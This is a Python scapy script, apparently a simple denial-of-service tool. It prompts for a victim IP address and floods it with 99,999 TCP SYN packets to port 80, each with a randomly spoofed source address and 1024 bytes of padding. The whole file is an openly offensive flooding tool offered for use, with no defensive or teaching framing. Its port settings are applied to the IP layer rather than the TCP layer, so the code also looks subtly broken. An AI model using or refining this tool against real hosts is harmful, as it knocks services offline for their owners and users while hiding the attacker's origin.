from scapy.all import *
import random

class vic_dev():
    def __init__(self, ipaddr):
        self.ipaddr = ipaddr

def banner():
    print('Interface : {}'.format(conf.iface))

def victim_ipaddr():
    print()
    print('IP addr')
    victim =  vic_dev(input(">>  "))
    return victim

def attack(victim):
    port = 80
    for x in range(0, 99999):
        packetIP = IP()
        packetIP.src = "%i.%i.%i.%i" % (random.randint(1, 254),random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))
        packetIP.dst =  victim.ipaddr
        packetTCP = TCP()
        packetIP.sport = RandShort()
        packetIP.dport = port
        packetTCP.flags = 'S'

        raw = Raw(b"N"*1024)
        packet = packetIP/packetTCP/raw

        send(packet, verbose=0)
        print("packet amount {}".format(str(x)))

def main():
    banner()
    victim = victim_ipaddr()
    print("attack {} ...".format(victim.ipaddr))
    attack(victim)

if __name__ == '__main__':
    main()
        
    
